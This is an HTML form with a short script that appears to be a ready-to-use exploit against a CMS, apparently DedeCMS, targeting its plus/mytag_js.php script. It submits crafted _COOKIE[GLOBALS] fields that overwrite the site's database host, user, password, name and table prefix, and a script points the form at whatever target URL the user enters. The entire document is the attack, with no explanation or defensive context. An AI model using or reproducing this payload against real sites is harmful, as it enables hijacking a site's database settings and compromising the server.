<form action="" method="post" name="QuickSearch" id="QuickSearch" onsubmit="addaction();">
<input type="text" value="http://local.articles.net/plus/mytag_js.php?aid=1" name="doaction" style="width:400"><br />
<input type="text" value="dbhost" name="_COOKIE[GLOBALS][cfg_dbhost]" style="width:400"><br />
<input type="text" value="dbuser" name="_COOKIE[GLOBALS][cfg_dbuser]" style="width:400"><br />
<input type="text" value="dbpwd" name="_COOKIE[GLOBALS][cfg_dbpwd]" style="width:400"><br />
<input type="text" value="dbname" name="_COOKIE[GLOBALS][cfg_dbname]" style="width:400"><br />
<input type="text" value="dede_" name="_COOKIE[GLOBALS][cfg_dbprefix]" style="width:400"><br />
<input type="text" value="true" name="nocache" style="width:400">
<input type="submit" value="提交" name="QuickSearchBtn"><br />
</form>
<script>
function addaction()
{
document.QuickSearch.action=document.QuickSearch.doaction.value;
}
</script>